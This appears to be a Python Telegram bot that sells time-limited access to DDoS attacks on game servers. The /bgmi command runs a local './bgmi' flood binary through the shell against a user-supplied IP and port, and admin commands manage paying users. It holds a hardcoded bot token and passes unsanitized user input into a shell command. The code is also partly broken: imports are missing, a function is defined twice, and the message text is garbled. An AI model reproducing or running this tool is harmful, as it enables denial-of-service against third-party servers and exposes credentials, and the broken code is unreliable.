import asyncio
import json
import logging
import time
import signal
from aiogram import Bot, Dispatcher
from aiogram.types import Message
import os 
import sys

logging.basicConfig(level=logging.INFO)


API_TOKEN = '7309999868:AAEE4MhVnNiqKTGtMXKwvcyQCH7wHLhW1ws'

AUTHORIZED_USERS = {}

def load_authorized_users():
    global AUTHORIZED_USERS
    try:
        with open("authorized_users.json", "r") as f:
            users = json.load(f)
            for user_id, user_data in users.items():
                if isinstance(user_data, dict) and "authorized_until" in user_data:
                    AUTHORIZED_USERS[int(user_id)] = {"authorized_until": datetime.datetime.fromtimestamp(user_data["authorized_until"])}
                else:
                    print(f"Warning: User {user_id} has no 'authorized_until' field in authorized_users.json")
    except FileNotFoundError:
        pass

def save_authorized_users():
    with open("authorized_users.json", "w") as f:
        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
        json.dump(users, f)

load_authorized_users()

ADMIN_ID = 6789097558

async def check_authorization(user_id):
    if user_id not in AUTHORIZED_USERS:
        return False
    user_data = AUTHORIZED_USERS[user_id]
    if user_data["authorized_until"] < datetime.datetime.now():
        del AUTHORIZED_USERS[user_id]
        save_authorized_users()
        return False
    return True

async def add_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("?? ?òΩHAI ?òº???ô¢???ô£ ???ô§ ???ôÆ?? ???ô™?ô¢ ? ???§£")
        return
    args = message.text.split()[1:]
    if len(args)!= 2:
        await message.answer("Usage: /adduser <user_id> <authorization_period>")
        return
    user_id = int(args[0])
    authorization_period = int(args[1])
    AUTHORIZED_USERS[user_id] = {"authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=authorization_period)}
    save_authorized_users()
    await message.answer(f"User {user_id} added with authorization period of {authorization_period} minutes.")

async def remove_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("?? ?òΩHAI ?òº???ô¢???ô£ ???ô§ ???ôÆ?? ???ô™?ô¢ ? ???§£")
        return
    args = message.text.split()[1:]
    if len(args)!= 1:
        await message.answer("Usage: /removeuser <user_id>")
        return
    user_id = int(args[0])
    if user_id in AUTHORIZED_USERS:
        del AUTHORIZED_USERS[user_id]
        save_authorized_users()
        await message.answer(f"User {user_id} removed.")
    else:
        await message.answer(f"User {user_id} not found.")

async def update_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("?? ?òΩHAI ?òº???ô¢???ô£ ???ô§ ???ôÆ?? ???ô™?ô¢ ? ???§£")
        return
    args = message.text.split()[1:]
    if len(args)!= 2:
        await message.answer("Usage: /updateuser <user_id> <new_authorization_period>")
        return
    user_id = int(args[0])
    new_authorization_period = int(args[1])
    if user_id in AUTHORIZED_USERS:
        AUTHORIZED_USERS[user_id]["authorized_until"] = datetime.datetime.now() + datetime.timedelta(minutes=new_authorization_period)
        save_authorized_users()
        await message.answer(f"User {user_id} updated with new authorization period of {new_authorization_period} minutes.")
    else:
        await message.answer(f"User {user_id} not found.")

async def list_users(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("?? ?òΩHAI ?òº???ô¢???ô£ ???ô§ ???ôÆ?? ???ô™?ô¢ ? ???§£")
        return
    user_list = []
    for user_id, user_data in AUTHORIZED_USERS.items():
        user_list.append(f"{user_id} - Authorized until: {user_data['authorized_until']}")
    await message.answer("Authorized users:\n" + "\n".join(user_list))

async def broadcast(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("?? ?òΩHAI ?òº???ô¢???ô£ ???ô§ ???ôÆ?? ???ô™?ô¢ ? ???§£")
        return
    text = message.text.split(maxsplit=1)[1]
    for user_id in AUTHORIZED_USERS:
        try:
            await bot.send_message(user_id, text)
        except Exception as e:
            logging.error(f"Error sending message to user {user_id}: {e}")

def save_authorized_users():
    with open("authorized_users.json", "w") as f:
        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
        json.dump(users, f)

async def restart_bot(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("?? ?òΩHAI ?òº???ô¢???ô£ ???ô§ ???ôÆ?? ???ô™?ô¢ ? ???§£")
        return
    await message.answer("Restarting bot...")
    save_authorized_users()
    os.execl(sys.executable, sys.executable, *sys.argv)

async def user_info(message: Message):
    user_id = message.from_user.id
    user_data = AUTHORIZED_USERS.get(user_id)
    if user_data:
        approval_expiry = user_data["authorized_until"]
        if approval_expiry > datetime.datetime.now():
            approval_expiry_str = approval_expiry.strftime("%Y-%m-%d %H:%M:%S")
        else:
            approval_expiry_str = "Not approved"
    else:
        approval_expiry_str = "???ô•?ô•?ô® ???ô§?ô© ???ô•?ô•?ôß?ô§?ô´???? ?òæ?ô§?ô£?ô©?????ô©  @SPEEDEL_GAMING "

    username = message.from_user.username
    await message.answer(f"?? ???ô§?ô°??: ???ô®???ôß\n"
                         f"?? ???ô®???ôß ???òø: {user_id}\n"
                         f"?ë§ ???ô®???ôß?ô£???ô¢??: {username}\n"
                         f"?? ?òº?ô•?ô•?ôß?ô§?ô´???ô° ?ô§?ôß ???ô≠?ô•???ôß?ôÆ: {approval_expiry_str}")
    
attack_process = None
last_attack_time = 0
async def welcome_user(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("?òº???????ô®?ô® ?????ô£??????\n ???ô§?ô™ ???ôß?? ?ô£?ô§?ô© ???ô™?ô©???ô§?ôß???ôØ???? ?ô©?ô§ ?ô™?ô®?? ?ô©?????ô® ???ô§?ô©\n ?????ô£???ô°?ôÆ ?òø?ô¢ @SPEEDEL_GAMING ???ô§ ?????ô© ?òº???????ô®?ô®")
        return

    await message.answer(f"?????ô°???ô§?ô¢?? ?ô©?ô§ ?òΩ?????? ?òº?ô©?ô©?????? ?òΩ?ô§?ô©! ??\n\n"

                         f"???????ô® ???ô§?ô© ???ô°?ô°?ô§?ô¨?ô® ?ôÆ?ô§?ô™ ?ô©?ô§ ?ô°???ô™?ô£???? ?? ?òΩ?????? ???ô©?ô©?????? ?ô§?ô£ ?? ?ô©???ôß?????ô© ???? ???ô£?? ?ô•?ô§?ôß?ô©.\n\n" 

                         f"?????ô¢?? <???ô•> <?ô•?ô§?ôß?ô©> <?ô©???ô¢??_?ô®?????ô§?ô£???ô®> <?ô©???ôß???????ô®>  \n\n"    

                           "???ô≠???ô¢?ô•?ô°??:/?????ô¢?? 20.235.94.237 17870 240 240\n\n") 

LAST_ATTACK_TIME = {}

async def bgmi_attack(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("?òº???????ô®?ô® ?????ô£??????\n ???ô§?ô™ ???ôß?? ?ô£?ô§?ô© ???ô™?ô©???ô§?ôß???ôØ???? ?ô©?ô§ ?ô™?ô®?? ?ô©?????ô® ???ô§?ô©\n ?????ô£???ô°?ôÆ ?òø?ô¢ @Sapeedel_Gaming ???ô§ ?????ô© ?òº???????ô®?ô®")
        return
    if message.from_user.id not in AUTHORIZED_USERS:
        await message.answer("?òº???????ô®?ô® ?????ô£??????\n ???ô§?ô™ ???ôß?? ?ô£?ô§?ô© ???ô™?ô©???ô§?ôß???ôØ???? ?ô©?ô§ ?ô™?ô®?? ?ô©?????ô® ???ô§?ô©\n ?????ô£???ô°?ôÆ ?òø?ô¢ @Speedel_Gaming ???ô§ ?????ô© ?òº???????ô®?ô®??.")
        return

    current_time = time.time()

    if message.from_user.id in LAST_ATTACK_TIME and current_time - LAST_ATTACK_TIME[message.from_user.id] < 300:
        remaining_seconds = 300 - (current_time - LAST_ATTACK_TIME[message.from_user.id])
        minutes, seconds = divmod(remaining_seconds, 60)
        time_str = f"{int(minutes)} ?ô¢???ô£?ô™?ô©???ô® ???ô£?? {int(seconds)} "
        await message.answer(f"???ô§?ô™ ?ô¢?ô™?ô®?ô© ?ô¨?????ô© {time_str}. ?ô®?????ô§?ô£???ô® ???????ô§?ôß?? ?ô®?ô©???ôß?ô©???ô£?? ???ô£?ô§?ô©?????ôß ???ô©?ô©??????")
        return

    args = message.text.split()[1:]
    if len(args) < 4:
        await message.answer(" ?§¶?ç‚?Ô∏è?ê?®?ñ?ú??: /?????ô¢?? <???ô•> <?ô•?ô§?ôß?ô©> <?ô©???ô¢??_?ô®?????ô§?ô£???ô®> \n\n ?§∑?ç‚?Ô∏è?Ä?ô≠???ô¢?ô•?ô°??  /?????ô¢?? 20.235.94.237 17870 240 240")
        return

    ip, port, time_seconds, threads = args
    command = f"./bgmi {ip} {port} {time_seconds} 500"

    LAST_ATTACK_TIME[message.from_user.id] = current_time

    await message.answer(f"???òº?ô©?ô©?????? ?ô®?ô©???ôß?ô©???? ?ô§?ô£?î´  \n  ?éØ????: {ip}\n ??Ô∏è?ã?????ô©: {port}\n ?ö?è?û?¢??: {time_seconds} ?ô®????.")
    
    try:
        attack_process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await attack_process.communicate()

        response = f"???òº?ô©?ô©?????? ?ô§?ô£ ?ÑÔ? {ip}:{port} \n ???òæ?ô§?ô¢?ô•?ô°???ô©???? ?????ô™???????ô®?ô®???ô™?ô°?ô°?ôÆ?•≥"
        if stdout:
            response += f"\nOutput:\n{stdout.decode()}"
        if stderr:
            response += f"\nErrors:\n{stderr.decode()}"

        await message.answer(response)

    except Exception as e:
        await message.answer(f"Error: {e}")

async def bgmi_stop(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("?òº???????ô®?ô® ?????ô£??????\n ???ô§?ô™ ???ôß?? ?ô£?ô§?ô© ???ô™?ô©???ô§?ôß???ôØ???? ?ô©?ô§ ?ô™?ô®?? ?ô©?????ô® ???ô§?ô©\n ?????ô£???ô°?ôÆ ?òø?ô¢ @Speedel_Gaming ???ô§ ?????ô© ?òº???????ô®?ô®")
        return
    if message.from_user.id not in AUTHORIZED_USERS:
        await message.answer("?òº???????ô®?ô® ?????ô£??????\n ???ô§?ô™ ???ôß?? ?ô£?ô§?ô© ???ô™?ô©???ô§?ôß???ôØ???? ?ô©?ô§ ?ô™?ô®?? ?ô©?????ô® ???ô§?ô©\n ?????ô£???ô°?ôÆ ?òø?ô¢ @Speedel_Gaming ???ô§ ?????ô© ?òº???????ô®?ô®??.")
        return
    # Rest of the bgmi stop code
    global attack_process
    if attack_process is not None:
        attack_process.terminate()
        attack_process.wait()
        attack_process = None
        await message.answer("??Attack stopped.")
    else:
        await message.answer("No attack is currently running.")

async def main():
    bot = Bot(token=API_TOKEN)
    dp = Dispatcher()

    # Register handlers
    dp.message.register(welcome_user, filters.Command("start"))
    dp.message.register(bgmi_attack, filters.Command(commands=['bgmi']))
    dp.message.register(broadcast, filters.Command("broadcast"))
    dp.message.register(bgmi_stop, filters.Command("stop"))
    dp.message.register(add_user, filters.Command("adduser"))
    dp.message.register(remove_user, filters.Command("removeuser"))
    dp.message.register(update_user, filters.Command("updateuser"))
    dp.message.register(list_users, filters.Command("listuser"))
    dp.message.register(restart_bot, filters.Command("restart"))
    dp.message.register(user_info, filters.Command("userinfo"))

    
    async def remove_expired_users():
        while True:
            global AUTHORIZED_USERS
            for user_id in list(AUTHORIZED_USERS.keys()):
                user_data = AUTHORIZED_USERS[user_id]
                if user_data["authorized_until"] < datetime.datetime.now():
                    del AUTHORIZED_USERS[user_id]
                    save_authorized_users()
            await asyncio.sleep(60)

    
    asyncio.create_task(remove_expired_users())

    
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())